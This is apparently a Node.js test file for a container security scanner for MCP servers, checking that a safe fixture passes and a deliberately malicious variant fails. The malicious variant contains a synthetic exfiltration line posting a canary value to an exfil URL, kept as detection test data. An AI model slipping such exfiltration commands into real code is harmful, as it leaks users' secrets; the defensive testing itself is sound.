import assert from 'node:assert/strict';
import test from 'node:test';
import { readFile } from 'node:fs/promises';
import { createServer } from 'node:http';
import { createOciProfileFixture, ociProfileScript, OCI_PROFILE_PROBE_PLAN } from './oci-profile-fixture.mjs';
import { prepareAndScanOciRuntime, scanOciRuntime } from '../../services/scanner/src/oci-scan.mjs';
import { readTrivyDatabaseIdentity } from '../../services/scanner/src/oci-trivy.mjs';
import { readTrustedOciRuntime } from '../../services/scanner/src/oci-trust.mjs';
import { assessOciPolicy } from '../../services/scanner/src/oci-policy.mjs';
import { canonicalJson, verifyEvidenceBundle } from '../../services/scanner/src/evidence.mjs';

test('approved-base OCI fixture variants are authored inert source with the same two tool pages and a synthetic-only malicious mutation', async () => {
  const original = await readFile(new URL('../../demo/fixtures/oci-profile/safe-server.sh', import.meta.url), 'utf8');
  const safe = ociProfileScript(original, 'safe'), malicious = ociProfileScript(original, 'malicious');
  assert.equal(safe.includes('MCP_CANARY_PATH'), false); assert.equal(safe.includes('wget'), false);
  assert.equal(malicious.includes('MCP_CANARY_PATH'), true);
  assert.ok(malicious.includes('--post-data "{\\"canary\\":\\"$value\\"}" "$MCP_EXFIL_URL"'));
  for (const source of [safe, malicious]) {
    assert.ok(source.includes('"nextCursor":"next"'));
    assert.ok(source.includes('"name":"read_messages"')); assert.ok(source.includes('"name":"read_context"'));
    assert.ok(source.includes('/bin/busybox id -u'));
    // Native Gateway full-pagination uses UUID string IDs; the fixture must
    // preserve the JSON scalar, including quotes, rather than parse a number.
    assert.ok(source.includes('sed -n \'s/.*"id":\\([^,}]*\\).*/\\1/p\''));
    assert.equal(source.includes('https://'), false);
  }
  assert.throws(() => ociProfileScript(original, 'unknown'), /VARIANT_INVALID/);
  assert.throws(() => ociProfileScript('unmatched template', 'malicious'), /TEMPLATE_INVALID/);
});

test('actual Linux approved-base OCI safe PASS and canary FAIL are independently replayed with native package/SBOM coverage', {
  skip: process.env.MCPSHIELD_DOCKER_TESTS !== '1' || process.env.MCPSHIELD_OCI_PROFILE_TESTS !== '1' ||
    !process.env.MCPSHIELD_RUNTIME_BUILDER_IMAGE || !process.env.MCPSHIELD_TRIVY_IMAGE || !process.env.MCPSHIELD_TRIVY_DATABASE_DIR,
  timeout: 900_000,
}, async () => {
  const builderImageDigest = process.env.MCPSHIELD_RUNTIME_BUILDER_IMAGE, databaseDir = process.env.MCPSHIELD_TRIVY_DATABASE_DIR;
  const database = await readTrivyDatabaseIdentity({ databaseDir });
  const trust = { baseImageDigest: builderImageDigest, sinkImageDigest: builderImageDigest,
    trivyImageDigest: process.env.MCPSHIELD_TRIVY_IMAGE, databaseDir, databaseDigest: database.databaseDigest };
  const requests = [];
  const server = createServer(async (request, response) => {
    const chunks = []; for await (const chunk of request) chunks.push(chunk);
    const body = JSON.parse(Buffer.concat(chunks));
    const generation = Object.hasOwn(body.responseSchema?.properties ?? {}, 'scenarios');
    // Classification only is retained; never log/store raw prompt/source here.
    requests.push(generation ? 'PROBE_PLAN' : 'SEMANTIC_CONTRACT');
    response.writeHead(200, { 'content-type': 'application/json' }).end(JSON.stringify(generation ? OCI_PROFILE_PROBE_PLAN : {
      riskClaims: [], semanticDiff: { purposeChanged: false, dataScopeExpanded: false, newHiddenObligation: false }, needsHumanReview: false,
    }));
  });
  await new Promise((done) => server.listen(0, '127.0.0.1', done));
  const ai = { allowRemoteAi: true, provider: 'custom', disclosurePolicy: 'LOCAL_CONTRACT_TEST', url: `http://127.0.0.1:${server.address().port}` };
  try {
    for (const variant of ['safe', 'malicious']) {
      const fixture = await createOciProfileFixture({ builderImageDigest, variant });
      let original;
      try {
        assert.ok(fixture.sourceBytes <= 100 * 1024 * 1024);
        const sourceReleaseId = '0x' + (variant === 'safe' ? 'a' : 'b').repeat(64), releaseId = 'authored-oci-profile@' + (variant === 'safe' ? '1.0.0' : '1.0.1');
        original = await prepareAndScanOciRuntime({ preparation: { root: fixture.root, sourceTreeDigest: fixture.sourceTreeDigest, platform: fixture.platform },
          sourceReleaseId, releaseId, trust, ai, probePlan: OCI_PROFILE_PROBE_PLAN });
        const safeDiagnostic = () => JSON.stringify({ variant, analysis: original.analysis, status: original.result?.scanStatus });
        assert.ok(original.binding, safeDiagnostic());
        assert.ok(original.binding.descriptor.layerArchiveBytes + original.binding.descriptor.exportArchiveBytes <= 512 * 1024 * 1024);
        assert.equal(original.result.scanStatus, variant === 'safe' ? 'PASSED' : 'FAILED', safeDiagnostic());
        assert.equal(original.analysis.verdict, variant === 'safe' ? 'PASS' : 'FAIL', safeDiagnostic());
        assert.equal(original.analysis.semanticEvidenceMode, 'LOCAL_CONTRACT_TEST'); assert.equal(original.analysis.ready, false);
        const source = JSON.parse(original.bundle.files['oci/source-reconstruction.json']);
        assert.equal(source.coverage.sourceClassificationComplete, true, safeDiagnostic());
        assert.equal(source.coverage.unknownBinaryFiles, 0); assert.equal(source.coverage.unsupportedEntries, 0);
        const vulnerability = JSON.parse(original.bundle.files['oci/image-review.json']).vulnerability;
        assert.equal(vulnerability.status, 'COMPLETE', safeDiagnostic()); assert.equal(vulnerability.highCriticalCount, 0);
        assert.ok(vulnerability.images.every(({ packageListComplete, packages }) => packageListComplete && packages > 0));
        const localTrust = await readTrustedOciRuntime({ descriptor: original.binding.descriptor, expectedDescriptorDigest: original.binding.descriptorDigest, trust });
        assert.equal(assessOciPolicy(original.bundle, original.result, original.binding, localTrust).verdict, original.analysis.verdict);
        // No API-provided plan: independently generate a fresh local plan, repeat
        // native export/Trivy and both semantic roles, then actual MCP probes.
        const independent = await scanOciRuntime({ descriptor: original.binding.descriptor, expectedDescriptorDigest: original.binding.descriptorDigest,
          sourceReleaseId, releaseId, trust, ai });
        assert.equal(independent.analysis.verdict, original.analysis.verdict, JSON.stringify({ variant, analysis: independent.analysis }));
        assert.equal(assessOciPolicy(independent.bundle, independent.result, independent.binding, localTrust).verdict, original.analysis.verdict);
        assert.notEqual(original.result.scanId, independent.result.scanId);
        assert.notEqual(original.bundle.manifest.root, independent.bundle.manifest.root);
        const scopes = (result) => [...new Set(result.findings.filter(({ deterministic }) => deterministic)
          .map(({ code, severity, stage, evidence }) => canonicalJson({ code, severity, stage, observer: evidence.observer ?? null })))].sort();
        assert.deepEqual(scopes(independent.result), scopes(original.result));
        assert.equal(verifyEvidenceBundle(original.bundle, original.bundle.manifest.root), true);
        assert.equal(verifyEvidenceBundle(independent.bundle, independent.bundle.manifest.root), true);
      } finally { await original?.cleanup?.(); await fixture.cleanup(); }
    }
    assert.ok(requests.filter((kind) => kind === 'PROBE_PLAN').length >= 2);
    assert.ok(requests.filter((kind) => kind === 'SEMANTIC_CONTRACT').length >= 8);
  } finally { await new Promise((done) => server.close(done)); }
});
